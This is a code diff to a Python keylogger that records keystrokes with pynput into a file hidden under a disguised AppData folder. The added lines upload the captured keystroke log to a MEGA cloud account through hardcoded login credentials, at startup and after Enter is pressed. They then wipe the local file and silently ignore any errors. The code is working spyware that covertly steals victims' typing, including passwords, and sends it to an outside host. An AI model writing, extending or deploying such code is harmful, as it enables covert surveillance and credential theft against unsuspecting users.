@@ -1,11 +1,13 @@
 from pynput import keyboard
 from datetime import datetime
 import os
+from mega import Mega
 
 class InputDetection:
 
     def __init__(self):
         self.PATH = os.path.expanduser("~")+"\\AppData\\local\\WindowREP_2\\keys.txt"
+        self.uploaded = False
         pass
 
     def print_date(self):
@@ -30,14 +32,33 @@ class InputDetection:
                     file.write("\n")
                     time = datetime.now().strftime("[%D %H:%M:%S]--> ")
                     file.write(time)
+                    if not self.uploaded:
+                        self.try_upload()
                 elif key == keyboard.Key.ctrl:
                     file.write("{ctrl}")
 
                 elif key == keyboard.Key.backspace:
                     file.write("<backspace>")
+    
+    def refresh_file(self):
+        with open(self.PATH,'w') as file:
+            file.write("refreshed\n")
+        self.print_date()
+        
+    def try_upload(self):
+        try:
+            mega = Mega()
+            mega.login("totallylegit4sure@gmail.com", "youfoundit")
+            file = self.PATH
+            mega.upload(file)
+            self.refresh_file()
+            self.uploaded = True
+        except:
+            pass
 
     def run(self):
         self.print_date()
+        self.try_upload()
         with keyboard.Listener(
                 on_press=self.on_press) as listener:
             listener.join()
